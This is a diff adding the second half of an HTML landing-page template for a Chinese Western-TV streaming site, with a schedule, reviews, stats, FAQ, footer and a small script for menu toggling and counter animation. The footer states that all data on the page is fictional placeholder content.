+      <div class="it"><div class="dt"><b>周三</b>WED · 22:00</div><div class="cx"><span class="fl">更新</span><span class="tx"><h4>巴黎咖啡馆 EP.06</h4><span>都市爱情 · 法剧 · 中法字幕</span></span><span class="ep">第 6 集</span></div></div>
+      <div class="it"><div class="dt"><b>周四</b>THU · 20:00</div><div class="cx"><span class="fl">NEW</span><span class="tx"><h4>星际征途 EP.07</h4><span>硬科幻 · 美剧 · 中英双语字幕</span></span><span class="ep">第 7 集</span></div></div>
+      <div class="it"><div class="dt"><b>周五</b>FRI · 21:30</div><div class="cx"><span class="fl">电影</span><span class="tx"><h4>冰海沉船（影院版上线）</h4><span>灾难惊悚 · 欧美电影 · 4K 专区</span></span><span class="ep">正片</span></div></div>
+      <div class="it"><div class="dt"><b>周六</b>SAT · 19:00</div><div class="cx"><span class="fl">综艺</span><span class="tx"><h4>全明星厨艺对决 S12</h4><span>欧美综艺 · 真人秀 · 全 10 集</span></span><span class="ep">第 3 集</span></div></div>
+      <div class="it"><div class="dt"><b>周日</b>SUN · 22:00</div><div class="cx"><span class="fl">纪录片</span><span class="tx"><h4>地球脉动：极地 EP.02</h4><span>自然纪录片 · BBC 出品 · 4K</span></span><span class="ep">第 2 集</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：观众影评 -->
+<section id="rvs" class="rvs">
+  <div class="container">
+    <div class="sec-h" style="margin-bottom:32px"><div class="lhs"><span class="no">06 / REVIEWS</span><h2>观众影评</h2></div><a href="#" class="more">全部评价 ›</a></div>
+    <div class="rvg">
+      <div class="rv"><div class="stars">★★★★★</div><h4>节奏与表演双双在线</h4><p>《暗潮汹涌》每一集都有反转，编剧功底扎实，双语字幕质量也很高，观感几乎无瑕疵。</p><div class="au"><span class="av">L</span><div><b>Lin</b><span>追剧 3 年 · 已看 1280 集</span></div></div></div>
+      <div class="rv"><div class="stars">★★★★☆</div><h4>英剧的克制与高级</h4><p>《伦敦谜案》短小精悍，镜头语言和配乐都是电影级别，一周一集太折磨人。</p><div class="au"><span class="av">M</span><div><b>Mark</b><span>英剧爱好者 · 已看 642 集</span></div></div></div>
+      <div class="rv"><div class="stars">★★★★★</div><h4>字幕党福音</h4><p>中英切换流畅，专有名词还有注释，边看边学英语，已经安利给全办公室。</p><div class="au"><span class="av">S</span><div><b>Sarah</b><span>英语学习者 · 已看 405 集</span></div></div></div>
+      <div class="rv"><div class="stars">★★★★☆</div><h4>欧剧冷门宝藏</h4><p>《巴黎咖啡馆》那种法式松弛感太迷人，法文字幕配中文对照，体验很特别。</p><div class="au"><span class="av">J</span><div><b>Julia</b><span>法剧迷 · 已看 318 集</span></div></div></div>
+      <div class="rv"><div class="stars">★★★★★</div><h4>更新速度很稳</h4><p>海外播出后基本第二天就有资源带字幕，追新剧的体验比预期好太多。</p><div class="au"><span class="av">D</span><div><b>David</b><span>科幻迷 · 已看 962 集</span></div></div></div>
+      <div class="rv"><div class="stars">★★★★☆</div><h4>纪录片画质惊艳</h4><p>《地球脉动》4K 版细节拉满，投屏到电视上效果不输影院，每周日准时蹲守。</p><div class="au"><span class="av">K</span><div><b>Kate</b><span>纪录片控 · 已看 210 集</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目七：平台数据 -->
+<section id="data" class="sta">
+  <div class="container">
+    <div class="sec-h"><div class="lhs"><span class="no">07 / STATS</span><h2>平台数据</h2></div><span class="sub">真实统计 · 持续更新</span></div>
+    <div class="grid" style="margin-top:36px">
+      <div class="k"><b data-c="2800" data-s="万+">0</b><span>活跃用户</span><p>覆盖全球华人观众</p></div>
+      <div class="k"><b data-c="86000" data-s="+">0</b><span>影视资源</span><p>美剧英剧电影综艺</p></div>
+      <div class="k"><b data-c="12" data-s="国">0</b><span>内容来源</span><p>美英法等 12 国影视</p></div>
+      <div class="k"><b data-c="99.8" data-s="%">0</b><span>播放稳定率</span><p>全年可用性统计</p></div>
+    </div>
+    <div class="hbs">
+      <div class="hb"><span class="lb">美剧</span><span class="tr"><i data-h="92"></i></span><span class="vl">38%</span></div>
+      <div class="hb"><span class="lb">英剧</span><span class="tr"><i data-h="74"></i></span><span class="vl">24%</span></div>
+      <div class="hb"><span class="lb">欧美电影</span><span class="tr"><i data-h="62"></i></span><span class="vl">18%</span></div>
+      <div class="hb"><span class="lb">欧剧</span><span class="tr"><i data-h="42"></i></span><span class="vl">11%</span></div>
+      <div class="hb"><span class="lb">纪录片</span><span class="tr"><i data-h="28"></i></span><span class="vl">6%</span></div>
+      <div class="hb"><span class="lb">其他</span><span class="tr"><i data-h="18"></i></span><span class="vl">3%</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about" class="about">
+  <div class="container ab">
+    <div class="lhs">
+      <span class="kicker">ABOUT · 关于本站</span>
+      <h2>关于欧美影视<br>oumeiyingshi-cn</h2>
+      <p>欧美影视（oumeiyingshi-cn）成立于 2018 年，是一个专注美剧、英剧、欧美电影在线观看的影视资源平台，致力于让国内观众同步追上海外好剧。</p>
+      <p>从选片、译制到上线全程把控，双语字幕人工校对，更新节奏紧跟海外播出，六年累计陪伴超 2800 万观众度过观影时光。</p>
+      <div class="chs">
+        <div class="ch"><span>01</span><b>同步海外</b><p style="font-size:13px;color:var(--txt2);margin:0">播出后快速上线</p></div>
+        <div class="ch"><span>02</span><b>双语字幕</b><p style="font-size:13px;color:var(--txt2);margin:0">中英繁三语可选</p></div>
+        <div class="ch"><span>03</span><b>多端适配</b><p style="font-size:13px;color:var(--txt2);margin:0">手机电脑电视投屏</p></div>
+        <div class="ch"><span>04</span><b>清爽界面</b><p style="font-size:13px;color:var(--txt2);margin:0">无繁琐打扰</p></div>
+      </div>
+      <a href="#" class="mast" style="font-size:20px">了解更多 ›</a>
+    </div>
+    <div class="rhs">
+      <div class="q"><span class="qn">Q</span><div class="qa"><h4>更新速度如何？</h4><p>海外播出后基本在 24 小时内完成译制上线，热门剧集优先处理，具体以 <a href="#">更新日历</a> 为准。</p></div></div>
+      <div class="q"><span class="qn">Q</span><div class="qa"><h4>字幕可以切换吗？</h4><p>支持简体中文、繁体中文、英文字幕三种切换，部分影片提供隐藏式字幕开关。</p></div></div>
+      <div class="q"><span class="qn">Q</span><div class="qa"><h4>支持哪些设备？</h4><p>支持手机、平板、电脑浏览器直接访问，并提供 <a href="#">投屏教程</a>，一键投射到电视大屏。</p></div></div>
+      <div class="q"><span class="qn">Q</span><div class="qa"><h4>遇到问题如何反馈？</h4><p>可通过 <a href="#">帮助中心</a> 提交反馈，客服会在 1 个工作日内响应处理。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<footer class="ft">
+  <div class="container">
+    <div class="in">
+      <div><a href="#" class="mast">欧美影视<small>OUMEI YINGSHI · CN</small></a><p class="d">欧美影视 oumeiyingshi-cn 专注美剧、英剧、欧美电影在线观看，同步海外更新，高清双语字幕，海量欧美影视资源一站畅看。</p></div>
+      <div><h5>内容导航</h5><a href="#cats">类型索引</a><a href="#trend">热播剧场</a><a href="#subt">字幕中心</a><a href="#list">口碑片单</a><a href="#cal">更新日历</a></div>
+      <div><h5>用户服务</h5><a href="#">会员中心</a><a href="#">帮助中心</a><a href="#">意见反馈</a><a href="#">下载客户端</a><a href="#">投屏教程</a></div>
+      <div><h5>关于平台</h5><a href="#about">关于本站</a><a href="#">商务合作</a><a href="#">版权声明</a><a href="#">用户协议</a><a href="#">隐私政策</a></div>
+    </div>
+    <div class="bot"><span>© 2018-2026 欧美影视 OUMEIYINGSHI-CN · 本网站为演示模板，所有数据均为虚构占位</span><span class="ll"><a href="#">免责声明</a><a href="#">sitemap</a></span></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'),m=document.getElementById('menu');
+  if(btn&&m){btn.addEventListener('click',function(){m.classList.toggle('open')});
+    m.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){m.classList.remove('open')})})}
+  var bars=document.querySelectorAll('.sta .tr i'),kps=document.querySelectorAll('.sta .k b'),done=false;
+  function cnt(el){var c=+el.getAttribute('data-c'),s=el.getAttribute('data-s')||'',d=0,n=c>100?Math.ceil(c/60):(c>10?Math.ceil(c/40):1);
+    var iv=setInterval(function(){d+=n;if(d>=c){d=c;clearInterval(iv)}
+      el.textContent=(c>=100?Math.round(d):d)+s;},30)}
+  if(('IntersectionObserver' in window)){
+    var io=new IntersectionObserver(function(es){es.forEach(function(en){if(en.isIntersecting&&!done){done=true;
+      bars.forEach(function(b){b.style.width=b.getAttribute('data-h')+'%'});
+      kps.forEach(function(k){cnt(k)})}})},{threshold:.25});
+    var t=document.querySelector('.sta'); if(t)io.observe(t);
+  }
+})();
+</script>
+</body>
+</html>
